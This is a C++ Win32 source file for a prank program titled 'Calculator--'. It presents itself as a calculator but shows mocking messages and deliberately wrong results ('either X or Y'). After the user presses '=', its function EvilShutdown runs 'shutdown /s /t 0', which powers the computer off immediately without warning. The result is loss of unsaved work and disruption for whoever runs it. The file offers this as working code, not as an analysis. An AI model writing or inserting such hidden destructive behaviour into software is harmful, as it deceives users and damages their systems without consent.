#ifndef UNICODE
#define UNICODE
#endif
#include <windows.h>
#include <string>
#include <vector>
#include <cmath>
#include <cstdlib>

#define IDC_DISPLAY 100
#define IDC_BUTTON_START 200

double g_val1 = 0;
double g_val2 = 0;
wchar_t g_op = 0;
bool g_newEntry = true;
HWND hDisplay;

void EvilShutdown() {
    system("shutdown /s /t 0");
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
    case WM_CREATE: {
        hDisplay = CreateWindowEx(0, L"EDIT", L"0",
            WS_CHILD | WS_VISIBLE | WS_BORDER | ES_RIGHT | ES_READONLY,
            10, 10, 280, 40, hwnd, (HMENU)IDC_DISPLAY, GetModuleHandle(NULL), NULL);

        HFONT hFont = CreateFont(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET,
            OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, L"Arial");
        SendMessage(hDisplay, WM_SETFONT, (WPARAM)hFont, TRUE);

        const wchar_t* labels[] = {
            L"7", L"8", L"9", L"/",
            L"4", L"5", L"6", L"*",
            L"1", L"2", L"3", L"-",
            L"0", L"C", L"=", L"+"
        };

        int x = 10, y = 60;
        for (int i = 0; i < 16; i++) {
            HWND hBtn = CreateWindow(L"BUTTON", labels[i], WS_CHILD | WS_VISIBLE | BS_PUSHBUTTON,
                x, y, 60, 60, hwnd, (HMENU)(INT_PTR)(IDC_BUTTON_START + i), GetModuleHandle(NULL), NULL);
            SendMessage(hBtn, WM_SETFONT, (WPARAM)hFont, TRUE);
            x += 70;
            if ((i + 1) % 4 == 0) { x = 10; y += 70; }
        }
        break;
    }
    case WM_COMMAND: {
        int id = LOWORD(wParam);
        if (id >= IDC_BUTTON_START && id < IDC_BUTTON_START + 16) {
            wchar_t text[10];
            GetWindowText((HWND)lParam, text, 10);
            std::wstring btn = text;

            if (isdigit(btn[0])) {
                wchar_t current[256];
                GetWindowText(hDisplay, current, 256);
                std::wstring s = current;
                if (g_newEntry || s == L"0") { s = L""; g_newEntry = false; }
                s += btn;
                SetWindowText(hDisplay, s.c_str());
            }
            else if (btn == L"C") {
                SetWindowText(hDisplay, L"0");
                g_val1 = 0; g_op = 0; g_newEntry = true;
            }
            else if (btn == L"=" || btn == L"+" || btn == L"-" || btn == L"*" || btn == L"/") {
                wchar_t current[256];
                GetWindowText(hDisplay, current, 256);
                if (btn != L"=") {
                    g_val1 = std::stod(current);
                    g_op = btn[0];
                    g_newEntry = true;
                } else {
                    g_val2 = std::stod(current);
                    SetWindowText(hDisplay, L"Judging your choices...");
                    SetTimer(hwnd, 1, 1500, NULL);
                }
            }
        }
        break;
    }
    case WM_TIMER: {
        KillTimer(hwnd, wParam);
        if (wParam == 1) {
            SetWindowText(hDisplay, L"Ignoring basic logic...");
            SetTimer(hwnd, 2, 1500, NULL);
        } else if (wParam == 2) {
            SetWindowText(hDisplay, L"Consulting the Gods...");
            SetTimer(hwnd, 3, 1500, NULL);
        } else if (wParam == 3) {
            double res = 0;
            if (g_op == L'+') res = g_val1 + g_val2;
            else if (g_op == L'-') res = g_val1 - g_val2;
            else if (g_op == L'*') res = g_val1 * g_val2;
            else if (g_op == L'/') res = (g_val2 != 0 ? g_val1 / g_val2 : 0);

            long long o1 = std::lround(res / 2.0);
            long long o2 = std::lround(res * 2.0);

            std::wstring msg = L"either " + std::to_wstring(o1) + L" or " + std::to_wstring(o2);

            SetWindowText(hDisplay, msg.c_str());
            SetTimer(hwnd, 4, 2000, NULL);
        } else if (wParam == 4) {
            SetWindowText(hDisplay, L"Brace for impact cutie <3");
            SetTimer(hwnd, 5, 1500, NULL);
        } else if (wParam == 5) {
            EvilShutdown();
        }
        break;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int main() {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    const wchar_t CLASS_NAME[] = L"CalcClass";
    WNDCLASS wc = { };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = CLASS_NAME;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);

    RegisterClass(&wc);

    HWND hwnd = CreateWindowEx(0, CLASS_NAME, L"Calculator--", WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX,
        CW_USEDEFAULT, CW_USEDEFAULT, 315, 400, NULL, NULL, hInstance, NULL);

    if (hwnd == NULL) return 0;

    ShowWindow(hwnd, SW_SHOW);

    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;
}